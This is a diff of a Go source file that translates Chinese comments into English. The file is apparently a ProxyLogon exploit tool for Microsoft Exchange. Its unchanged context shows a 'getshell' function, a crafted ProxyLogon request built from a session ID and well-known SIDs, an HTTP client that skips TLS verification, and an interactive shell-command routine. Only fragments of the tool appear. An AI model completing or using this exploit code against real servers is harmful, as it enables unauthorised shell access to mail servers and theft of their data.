@@ -66,18 +66,18 @@ func Between(str, starting, ending string) string {
 	return str[s : s+e]
 }
 
-// 声明两个新的错误返回
+// declare two new error returns
 var ErrNotPath = errors.New("Path Required")
 var ErrRegexp = errors.New("Regexp Fail")
 
 func execShell(input string) error {
-	// 去除输入中最后的换行
+	// remove trailing newline from input
 	input = strings.TrimSuffix(input, "\n")
 
-	// 去除输入前后的空格
+	// remove leading and trailing spaces from input
 	input = strings.TrimSpace(input)
 
-	// 正则匹配输入字符中连续多个空格替换为一个空格
+	// replace consecutive multiple spaces in the input with a single space via regex
 	r, err := regexp.Compile(" +")
 	if err != nil {
 		return ErrRegexp
@@ -86,7 +86,7 @@ func execShell(input string) error {
 
 	args := strings.Split(input, " ")
 
-	// 判断用户输入是否为cd
+	// check whether the user input is cd
 	switch args[0] {
 	case "cd":
 		if len(args) < 2 {
@@ -140,7 +140,7 @@ func getshell(target, mail, FQDN, sid string) {
 
 	proxyLogon_request := `<r at="Negotiate" ln="john"><s>` + sid + `</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>`
 
-	/*构造payload*/
+	/*construct payload*/
 
 	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
 	if !strings.Contains(target, "http") {
